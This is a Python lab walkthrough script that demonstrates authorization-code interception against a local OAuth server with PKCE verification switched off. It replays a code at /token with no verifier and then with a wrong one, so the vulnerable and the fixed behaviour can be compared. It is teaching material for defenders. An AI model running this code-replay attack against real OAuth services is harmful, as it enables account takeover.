#!/usr/bin/env python3
"""Task 5 walkthrough: open-redirect + missing PKCE verification, then the fix.
Assumes oauth-server is running on http://localhost:9000.

Windows/macOS/Linux, just needs `pip install requests`.

Usage:
    set PKCE_ENFORCED=false          (cmd)      or   $env:PKCE_ENFORCED="false"   (PowerShell)
    uvicorn app.main:app --port 9000
    python pkce_demo.py

    set PKCE_ENFORCED=true
    uvicorn app.main:app --port 9000
    python pkce_demo.py
"""
import base64
import hashlib
import json
import requests

BASE = "http://localhost:9000"
CLIENT_ID = "cybercart"
REDIRECT_URI = "http://localhost:5173/oauth/callback"


def pj(obj):
    print(json.dumps(obj, indent=2))


def make_challenge(verifier: str) -> str:
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    return base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")


def get_code(code_challenge=None, method=None):
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "state": "abc",
    }
    if code_challenge:
        params["code_challenge"] = code_challenge
        params["code_challenge_method"] = method
    r = requests.get(f"{BASE}/authorize", params=params, allow_redirects=False)
    location = r.headers.get("Location", "")
    print(f"   -> redirected to: {location}")
    code = location.split("code=")[1].split("&")[0] if "code=" in location else None
    return code


print("== Step 0: check current mode ==")
pj(requests.get(f"{BASE}/lab/pkce-status").json())
print()

print("== Step 1-2: victim 'logs in', auth server issues a code ==")
verifier = "legit-client-secret-verifier-1234567890"
challenge = make_challenge(verifier)
code = get_code(challenge, "S256")
print(f"   -> leaked/observed code: {code}")
print()

print("== Step 3: attacker obtains the code (open redirect / referrer leak / beacon) ==")
print("   (out of band -- attacker now just has the bare code string above)")
print()

print("== Step 4: attacker POSTs the code to /token WITHOUT the verifier ==")
resp = requests.post(f"{BASE}/token", data={
    "grant_type": "authorization_code",
    "code": code,
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
})
pj(resp.json())
print("   Vulnerable mode: attacker gets a valid access_token above, no verifier needed.")
print("   Fixed mode: this returns invalid_grant/PKCE failure instead.")
print()

print("== Step 5: fresh code, then attacker retries with a garbage verifier ==")
code2 = get_code(challenge, "S256")
resp2 = requests.post(f"{BASE}/token", data={
    "grant_type": "authorization_code",
    "code": code2,
    "client_id": CLIENT_ID,
    "redirect_uri": REDIRECT_URI,
    "code_verifier": "attacker-doesnt-know-this",
})
pj(resp2.json())
